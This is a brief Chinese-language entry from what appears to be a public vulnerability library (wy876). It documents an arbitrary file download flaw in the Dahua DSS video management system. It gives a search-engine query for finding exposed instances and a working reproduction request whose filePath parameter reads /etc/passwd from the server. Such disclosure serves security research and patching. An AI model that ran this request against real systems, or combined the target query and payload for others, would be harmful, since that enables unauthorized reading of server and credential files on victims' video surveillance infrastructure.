---
fofa: "app.name=="
source: "wy876 漏洞文库"
---

# 大华 DSS 视频管理系统 attachment_downloadByUrlAtt.action 任意文件下载漏洞

# 一、漏洞简介
大华 DSS 视频管理系统存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

# 二、影响版本
+ 大华 DSS 视频管理系统

# 三、资产测绘
+ hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`


+ 登录页面


# 四、漏洞复现
```plain
/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mb3iwwsxiz2bvrek>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
